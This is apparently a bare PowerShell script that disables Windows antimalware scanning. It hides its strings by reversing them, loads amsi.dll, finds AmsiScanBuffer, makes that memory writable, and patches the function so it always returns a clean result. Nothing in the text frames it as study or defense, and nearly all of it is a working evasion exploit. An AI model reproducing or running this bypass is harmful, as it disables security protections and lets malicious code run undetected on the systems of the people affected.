$Apple = @"
}
;)tcetorPdlOlfpl tniu tuo ,tcetorPweNlf tniu ,eziSwd rtPtnIU ,sserddApl rtPtnI(tcetorPlautriV loob nretxe citats cilbup    
])"23lenrek"(tropmIllD[    
;)emaNcorp gnirts ,eludoMh rtPtnI(sserddAcorPteG rtPtnI nretxe citats cilbup    
])"23lenrek"(tropmIllD[    
;)eman gnirts(yrarbiLdaoL rtPtnI nretxe citats cilbup    
])"23lenrek"(tropmIllD[    
{ 23niW ssalc cilbup
;secivreSporetnI.emitnuR.metsyS gnisu
;metsyS gnisu
"@
$Apple = $Apple.ToCharArray();[array]::Reverse($Apple);$Apple = $Apple -join ""

Add-Type $Apple

$DllName = "lld.isma".ToCharArray();[array]::Reverse($DllName);$DllName = $DllName -join ""
$DllAddr = [Win32]::LoadLibrary($DllName)

$FuncName = "reffuBnacSismA".ToCharArray();[array]::Reverse($FuncName);$FuncName = $FuncName -join ""
$FuncAddr = [Win32]::GetProcAddress($DllAddr, $FuncName)

$p = 0
[Win32]::VirtualProtect($FuncAddr, [uint32]5, 0x40, [ref]$p)

$Banana = [Byte[]] (0x31, 0xC0, 0xC3)
[System.Runtime.InteropServices.Marshal]::Copy($Banana, 0, $FuncAddr, $Banana.Length)
